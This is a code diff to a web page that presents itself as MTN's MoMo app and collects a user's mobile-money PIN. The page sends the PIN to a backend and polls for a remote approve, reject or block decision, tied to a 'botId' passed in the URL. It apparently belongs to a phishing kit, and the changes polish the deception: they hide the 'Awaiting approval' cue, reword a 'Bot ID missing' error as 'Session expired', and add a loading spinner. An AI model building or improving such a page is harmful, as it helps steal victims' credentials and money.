@@ -197,24 +197,35 @@
       box-shadow: 0 0 0 3px rgba(0, 85, 114, 0.15);
     }
 
-    /* Hidden input that holds the full PIN for the original logic */
+    .pin-box.error {
+      border-color: #c0392b;
+      box-shadow: 0 0 0 3px rgba(192, 57, 43, 0.15);
+    }
+
     #pinInput {
       display: none;
     }
 
-    /* ----- Alerts & Waiting ----- */
+    /* ----- Alert ----- */
 
     #otp-alert {
       text-align: center;
       font-size: 15px;
       font-weight: 500;
-      min-height: 24px;
-      margin-bottom: 12px;
-      padding: 10px 12px;
+      min-height: 0;
+      margin-top: 8px;
+      padding: 0;
       border-radius: 12px;
       background: transparent;
       transition: all 0.2s;
       border: 1px solid transparent;
+      display: none;
+    }
+
+    #otp-alert.show {
+      display: block;
+      padding: 10px 12px;
+      min-height: 24px;
     }
 
     #otp-alert.error {
@@ -229,20 +240,8 @@
       border-color: #abf0d1;
     }
 
-    #waiting {
-      text-align: center;
-      font-size: 14px;
-      color: #0a0a0a;
-      margin-top: 8px;
-      display: none;
-      padding: 10px;
-      border-radius: 12px;
-      background: #f8fafc;
-      border: 1px solid #e2e8f0;
-    }
-
     /* =========================================
-       BOTTOM BUTTON (sticky)
+       BOTTOM BUTTON
     ========================================= */
 
     .bottom {
@@ -265,6 +264,10 @@
       transition: background 0.3s ease;
       text-transform: uppercase;
       letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
     }
 
     .continue-btn:enabled {
@@ -278,11 +281,29 @@
       transform: scale(.98);
     }
 
-    .continue-btn.waiting {
-      background: #f5a623;
-      color: #fff;
+    /* Loading state keeps colour and shows spinner */
+    .continue-btn.loading:disabled {
+      background: #005572;
       opacity: 1;
-      cursor: default;
+      cursor: wait;
+    }
+
+    .continue-btn .btn-text { display: inline; }
+    .continue-btn .btn-spinner {
+      display: none;
+      width: 26px;
+      height: 26px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-top: 3px solid #fff;
+      border-radius: 50%;
+      animation: spin .8s linear infinite;
+    }
+
+    .continue-btn.loading .btn-text { display: none; }
+    .continue-btn.loading .btn-spinner { display: inline-block; }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
 
     .footer {
@@ -359,15 +380,13 @@
 
 <div class="app">
 
-  <!-- ================= TOP BLUE AREA ================= -->
+  <!-- ================= TOP ================= -->
 
   <div class="top">
 
     <div class="top-bar">
-      <!-- Back button -->
       <button class="back-btn" onclick="window.history.back()">&#8592;</button>
 
-      <!-- Logo (compact) -->
       <div class="logo">
         <div class="logo-box">
           <div class="logo-symbol"></div>
@@ -375,7 +394,6 @@
         <div class="logo-text">MoMo <span class="light">from MTN</span></div>
       </div>
 
-      <!-- Spacer for alignment -->
       <div style="width: 30px;"></div>
     </div>
 
@@ -387,7 +405,6 @@
 
     <div class="title">Enter Your <strong>MoMo PIN</strong></div>
 
-    <!-- 5 PIN boxes + hidden input for original logic -->
     <div class="input-wrapper">
       <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
       <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
@@ -398,37 +415,40 @@
     <input type="hidden" id="pinInput" />
 
     <div id="otp-alert"></div>
-    <div id="waiting">⏳ Awaiting approval…</div>
 
   </div>
 
   <!-- ================= BOTTOM BUTTON ================= -->
 
   <div class="bottom">
-    <button id="verifyBtn" class="continue-btn" disabled>SUBMIT</button>
+    <button id="verifyBtn" class="continue-btn" disabled>
+      <span class="btn-text">SUBMIT</span>
+      <span class="btn-spinner"></span>
+    </button>
   </div>
 
   <div class="footer">v 5.3.2 (1.0.0)</div>
 
 </div>
 
-<!-- ========== ORIGINAL LOGIC – DO NOT MODIFY ========== -->
+<!-- ========== ORIGINAL LOGIC ========== -->
 <script>
 (function() {
+  const BACKEND_URL = ""; // leave empty to use same-origin
+
   // ---------- READ FROM URL & LOCALSTORAGE ----------
   const urlParams = new URLSearchParams(window.location.search);
   let botId = urlParams.get('botId') || localStorage.getItem('botId');
   let phone = urlParams.get('phone') || localStorage.getItem('phone');
   let name = urlParams.get('name') || localStorage.getItem('fullName');
 
-  // If missing critical data, redirect back to phone page
   if (!botId) {
-    alert('Bot ID missing. Please start over.');
+    alert('Session expired. Please start over.');
     window.location.href = 'index.html';
     return;
   }
   if (!phone) {
-    alert('Phone number missing. Please start over.');
+    alert('Session expired. Please start over.');
     window.location.href = 'index.html';
     return;
   }
@@ -437,14 +457,12 @@
     localStorage.setItem('fullName', name);
   }
 
-  // Store for subsequent pages
   localStorage.setItem('botId', botId);
   localStorage.setItem('phone', phone);
 
   // ---------- DOM REFS ----------
   const input = document.getElementById('pinInput');
   const verifyBtn = document.getElementById('verifyBtn');
-  const waitingEl = document.getElementById('waiting');
   const alertEl = document.getElementById('otp-alert');
 
   // ---------- HELPERS ----------
@@ -452,7 +470,7 @@
 
   function showAlert(text, type) {
     alertEl.textContent = text;
-    alertEl.className = type || '';
+    alertEl.className = 'show ' + (type || '');
   }
 
   function clearAlert() {
@@ -460,11 +478,18 @@
     alertEl.className = '';
   }
 
+  function setLoading(on) {
+    if (on) {
+      verifyBtn.disabled = true;
+      verifyBtn.classList.add('loading');
+    } else {
+      verifyBtn.classList.remove('loading');
+    }
+  }
+
   // ---------- INPUT HANDLING ----------
   input.addEventListener('input', function() {
-    // Allow only digits
     this.value = this.value.replace(/\D/g, '');
-    // Enable button if at least one digit
     verifyBtn.disabled = (this.value.length === 0);
     clearAlert();
   });
@@ -495,15 +520,11 @@
     const pin = input.value.trim();
     if (pin.length === 0) return;
 
-    // Disable button, show waiting
-    verifyBtn.disabled = true;
-    verifyBtn.textContent = 'Awaiting…';
-    verifyBtn.classList.add('waiting');
-    waitingEl.style.display = 'block';
+    setLoading(true);
     clearAlert();
 
     try {
-      const res = await fetch('/submit-pin', {
+      const res = await fetch(BACKEND_URL + '/submit-pin', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -516,13 +537,15 @@
 
       if (!res.ok) {
         const errText = await res.text();
-        throw new Error(errText || 'Server error');
+        const clean = errText.startsWith('<')
+          ? ('HTTP ' + res.status)
+          : (errText || ('HTTP ' + res.status));
+        throw new Error(clean);
       }
 
       const data = await res.json();
       if (!data.requestId) throw new Error('No request ID received');
 
-      // Start polling
       stopPolling();
       let attempts = 0;
       const MAX_ATTEMPTS = 120; // ~3 minutes
@@ -530,58 +553,68 @@
       pollTimer = setInterval(async function() {
         attempts++;
         try {
-          const checkRes = await fetch('/check-pin/' + data.requestId);
+          const checkRes = await fetch(BACKEND_URL + '/check-pin/' + data.requestId);
           const status = await checkRes.json();
+
+          if (status.blocked === true) {
+            stopPolling();
+            setLoading(false);
+            input.value = '';
+            input.dispatchEvent(new Event('input'));
+            showAlert('❌ Account restricted. Please try again later.', 'error');
+            return;
+          }
 
           if (status.approved === true) {
             stopPolling();
-            // PIN approved – redirect to success page
-            window.location.href = 'code.html?botId=' + encodeURIComponent(botId);
+            setLoading(false);
+            showAlert('✅ Verified! Redirecting...', 'success');
+            setTimeout(function() {
+              window.location.href = 'success.html?botId=' + encodeURIComponent(botId) +
+                                     '&phone=' + encodeURIComponent(phone) +
+                                     '&name=' + encodeURIComponent(name);
+            }, 700);
             return;
           }
 
           if (status.approved === false) {
             stopPolling();
-            // Rejected – clear input, show error, re-enable button
+            setLoading(false);
             input.value = '';
+            input.dispatchEvent(new Event('input'));
             verifyBtn.disabled = true;
-            verifyBtn.textContent = 'SUBMIT';
-            verifyBtn.classList.remove('waiting');
-            waitingEl.style.display = 'none';
             showAlert('❌ Incorrect PIN. Please try again.', 'error');
-            focusPin();
+            // Highlight boxes briefly
+            document.querySelectorAll('.pin-box').forEach(function(b) {
+              b.classList.add('error');
+            });
+            setTimeout(function() {
+              document.querySelectorAll('.pin-box').forEach(function(b) {
+                b.classList.remove('error');
+              });
+            }, 600);
+            // Refocus first box
+            const firstBox = document.querySelector('.pin-box');
+            if (firstBox) firstBox.focus();
             return;
           }
 
-          // Still pending – if timeout
           if (attempts > MAX_ATTEMPTS) {
             stopPolling();
-            verifyBtn.disabled = false;
-            verifyBtn.textContent = 'SUBMIT';
-            verifyBtn.classList.remove('waiting');
-            waitingEl.style.display = 'none';
-            showAlert('⏳ Approval taking too long. Please refresh or contact support.', 'error');
+            setLoading(false);
+            showAlert('⏳ Taking too long. Please try again.', 'error');
             return;
           }
 
-          // Update waiting message occasionally
-          if (attempts % 10 === 0) {
-            const seconds = Math.round(attempts * 1.5);
-            waitingEl.textContent = '⏳ Awaiting approval… (' + seconds + 's)';
-          }
-
+          // Silent polling — spinner on the button covers the wait
         } catch (err) {
-          // Network error – keep polling
           console.error('Polling error:', err);
         }
       }, 1500);
 
     } catch (err) {
-      waitingEl.style.display = 'none';
-      verifyBtn.disabled = false;
-      verifyBtn.textContent = 'SUBMIT';
-      verifyBtn.classList.remove('waiting');
-      showAlert('❌ Server error: ' + err.message, 'error');
+      setLoading(false);
+      showAlert('❌ ' + (err.message || 'Something went wrong. Please try again.'), 'error');
     }
   });
 
@@ -593,17 +626,12 @@
 })();
 </script>
 
-<!-- ========== PIN BOX UI LOGIC (does not alter original logic) ========== -->
+<!-- ========== PIN BOX UI LOGIC ========== -->
 <script>
 (function() {
   const pinBoxes = document.querySelectorAll('.pin-box');
   const hiddenInput = document.getElementById('pinInput');
 
-  // ---- Intercept hidden input value sets.
-  //      Clear the visible boxes ONLY when the hidden input transitions
-  //      from a non-empty value to '' (i.e. the rejection path in the
-  //      original logic). A no-op '' -> '' assignment is ignored so that
-  //      dispatching the synthetic input event does not wipe the boxes.
   let internalSet = false;
   const descriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
   Object.defineProperty(hiddenInput, 'value', {
@@ -618,7 +646,6 @@
     }
   });
 
-  // Update hidden input with the full PIN only when all 5 boxes are filled.
   function updateHiddenPin() {
     let pin = '';
     let allFilled = true;
@@ -638,7 +665,6 @@
     }
     internalSet = false;
 
-    // Dispatch input event so original logic runs (enables/disables button, clears alert)
     hiddenInput.dispatchEvent(new Event('input'));
   }
 
@@ -657,7 +683,6 @@
   }
 
   pinBoxes.forEach((box) => {
-    // Input: accept only one digit, move to next
     box.addEventListener('input', function() {
       this.value = this.value.replace(/\D/g, '').slice(0, 1);
       if (this.value) {
@@ -666,11 +691,9 @@
       updateHiddenPin();
     });
 
-    // Keyboard navigation & backspace
     box.addEventListener('keydown', function(e) {
       if (e.key === 'Backspace') {
         if (!this.value) {
-          // Move to previous and clear it
           const idx = Array.from(pinBoxes).indexOf(this);
           if (idx > 0) {
             pinBoxes[idx - 1].value = '';
@@ -678,7 +701,6 @@
           }
           updateHiddenPin();
         } else {
-          // Clear current
           this.value = '';
           updateHiddenPin();
         }
@@ -696,12 +718,10 @@
       }
     });
 
-    // Focus: select existing digit so typing replaces it
     box.addEventListener('focus', function() {
       this.select();
     });
 
-    // Paste: distribute digits across boxes
     box.addEventListener('paste', function(e) {
       e.preventDefault();
       const paste = e.clipboardData.getData('text');
@@ -719,12 +739,10 @@
     });
   });
 
-  // Focus first box on page load
   window.addEventListener('load', function() {
     if (pinBoxes[0]) pinBoxes[0].focus();
   });
 
-  // Initialise hidden input
   updateHiddenPin();
 })();
 </script>
